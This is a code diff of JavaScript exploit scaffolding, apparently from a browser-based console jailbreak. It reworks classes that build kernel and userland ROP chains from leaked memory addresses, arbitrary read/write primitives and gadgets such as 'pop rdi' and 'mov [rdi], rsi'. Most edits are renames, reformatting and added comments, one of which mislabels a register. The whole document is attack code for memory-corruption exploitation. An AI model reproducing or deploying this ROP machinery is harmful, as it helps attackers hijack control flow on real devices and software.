@@ -33,12 +33,12 @@ function stringify(str)
   window.nogc.push(bufView);
   return p.read8(p.leakval(bufView).add32(0x10));
 }
+
 // Class for quickly creating a kernel ROP chain
 var krop = function (p, addr) {
   // Contains base and stack pointer for fake stack (this.stackBase = RBP, this.stackPointer = RSP)
   this.stackBase    = addr;
   this.stackPointer = 0;
-
 
   // Push instruction / value onto fake stack
   this.push = function (val) {
@@ -59,14 +59,16 @@ var krop = function (p, addr) {
   return this;
 };
 
-window.Rop = function () {
-        this.stack = new Uint32Array(0x10000);
-        this.stackBase = p.read8(p.leakval(this.stack).add32(0x10));
-        this.count = 0;
+// Class for quickly creating and managing a ROP chain
+window.rop = function() {
+  this.stack        = new Uint32Array(0x10000);
+  this.stackBase    = p.read8(p.leakval(this.stack).add32(0x10));
+  this.count        = 0;
 
   this.clear = function() {
     this.count   = 0;
     this.runtime = undefined;
+
     for(var i = 0; i < 0xFF0 / 2; i++)
     {
       p.write8(this.stackBase.add32(i*8), 0);
@@ -88,46 +90,41 @@ window.Rop = function () {
 
   this.push_write8 = function(where, what)
   {
-      this.push(gadgets["pop rdi"]);
-      this.push(where);
-      this.push(gadgets["pop rsi"]);
-      this.push(what);
-      this.push(gadgets["mov [rdi], rsi"]);
+      this.push(gadgets["pop rdi"]); // pop rdi
+      this.push(where); // where
+      this.push(gadgets["pop rsi"]); // pop rsi
+      this.push(what); // what
+      this.push(gadgets["mov [rdi], rsi"]); // perform write
   }
 
   this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9)
   {
     if (rdi != undefined) {
-      this.push(gadgets["pop rdi"]);
-      this.push(rdi);
+      this.push(gadgets["pop rdi"]); // pop rdi
+      this.push(rdi); // what
     }
-
     if (rsi != undefined) {
-      this.push(gadgets["pop rsi"]);
-      this.push(rsi);
+      this.push(gadgets["pop rsi"]); // pop rsi
+      this.push(rsi); // what
     }
-
     if (rdx != undefined) {
-      this.push(gadgets["pop rdx"]);
-      this.push(rdx);
+      this.push(gadgets["pop rdx"]); // pop rdx
+      this.push(rdx); // what
     }
-
     if (rcx != undefined) {
-      this.push(gadgets["pop rcx"]);
-      this.push(rcx);
+      this.push(gadgets["pop rcx"]); // pop r10
+      this.push(rcx); // what
     }
-
     if (r8 != undefined) {
-      this.push(gadgets["pop r8"]);
-      this.push(r8);
+      this.push(gadgets["pop r8"]); // pop r8
+      this.push(r8); // what
     }
-    
     if (r9 != undefined) {
-      this.push(gadgets["pop r9"]);
-      this.push(r9);
+      this.push(gadgets["pop r9"]); // pop r9
+      this.push(r9); // what*/
     }
 
-    this.push(rip);
+    this.push(rip); // jmp
     return this;
   }
   
